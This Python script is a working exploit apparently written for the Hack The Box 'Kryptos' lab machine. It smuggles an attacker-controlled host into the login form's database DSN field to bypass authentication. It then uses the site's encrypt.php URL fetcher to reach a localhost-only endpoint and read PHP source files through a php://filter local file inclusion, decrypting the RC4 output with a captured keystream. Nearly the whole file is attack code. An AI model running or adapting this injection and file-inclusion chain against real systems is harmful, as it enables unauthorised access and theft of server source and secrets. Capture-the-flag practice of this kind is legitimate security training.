# kryptos_sqlite_test_page.py
import requests as r

target = "http://10.10.10.129"
htb_ipv4 = "10.10.12.248"
session = r.Session()

def clearScreen(clear="clear"):
    __import__("os").system(clear)

def encodeURL(parameter_value):
    return __import__("urllib").parse.quote(parameter_value)

def encryptRC4(file_url):
    parameters = (("cipher", "RC4"), ("url", file_url))
    return session.get(target+"/encrypt.php", params=parameters)

def extractText(regex_filter, text):
    return __import__("re").findall(regex_filter, text)[0]

def decryptRC4(rc4_base64):
    print("\n[Decrypted RC4]\n")    
    if(rc4_base64):     
        rc4 = __import__("base64").b64decode(rc4_base64)
        key_stream = open("rc4_key_stream", "rb").read()
        return "".join([chr(rc4[x]^key_stream[x]) for x in range(0, len(rc4))])
    else: return "Nothing was decypted..."

data = {
    "username": "placeholder",
    "password": "placeholder",
    "db": "cryptor;host="+htb_ipv4,
    "token": session.get(target).text[737:801],
    "login": ""
}
req_post = session.post(target, data=data)

while True:
    clearScreen()

    file_in = input("LFI for PHP Files (omit .php): ")
    if(file_in==""): exit()

    payload = "php://filter/convert.base64-encode/resource=" + file_in
    file_in = "http://127.0.0.1/dev/?view=" + payload

    req_encryption = encryptRC4(file_in)
    rc4_base64 = extractText('<text.*id="output">(.*)</text', req_encryption.text)
    if(rc4_base64): 
        lfi_content = extractText('</div>\n(.*)</body>', decryptRC4(rc4_base64))
        print(__import__("base64").b64decode(lfi_content).decode("unicode_escape"))

    input("--Press Enter to continue--")
